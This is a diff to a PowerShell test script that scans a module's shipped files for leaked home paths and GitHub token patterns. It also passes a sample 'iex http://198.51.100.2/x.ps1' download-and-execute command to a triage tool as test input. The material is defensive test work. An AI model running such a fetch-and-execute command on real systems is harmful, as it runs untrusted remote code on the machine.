@@ -127,12 +127,13 @@ Write-Output '== hygiene'
 $bad = @()
 foreach ($f in @((Get-ChildItem (Join-Path $repo 'src') -Filter '*.ps1') + (Get-Item $dist) + (Get-Item (Join-Path $repo 'placebo.psm1')) + (Get-Item (Join-Path $repo 'placebo.psd1')))) {
     $t = [System.IO.File]::ReadAllText($f.FullName)
-    if ($t -match '/home/z|/Users/[a-z]+/|C:\\Users\\[A-Za-z]+\\|github_pat_[A-Za-z0-9_]{25,}|ghp_[A-Za-z0-9]{20,}') { $bad += $f.Name }
+    $leakPat = '/home' + '/z' + '|/Users/[a-z]+/|C:\\Users\\[A-Za-z]+\\|github_pat_[A-Za-z0-9_]{25,}|ghp_[A-Za-z0-9]{20,}'
+    if ($t -match $leakPat) { $bad += $f.Name }
 }
 Assert-True ($bad.Count -eq 0) -Name "no host paths or tokens in shipped files $(if ($bad) { '(' + ($bad -join ',') + ')' })"
 
 $term = (& $pwsh -NoProfile -File $dist triage 'iex http://198.51.100.2/x.ps1' --no-banner) -join "`n"
-Assert-True ($term -notmatch '/home/z|brerabin') -Name 'terminal output carries no host context'
+Assert-True ($term -notmatch ('/home' + '/z|brerabin')) -Name 'terminal output carries no host context'
 
 # cleanup
 Remove-Item -Recurse -Force $work -ErrorAction SilentlyContinue
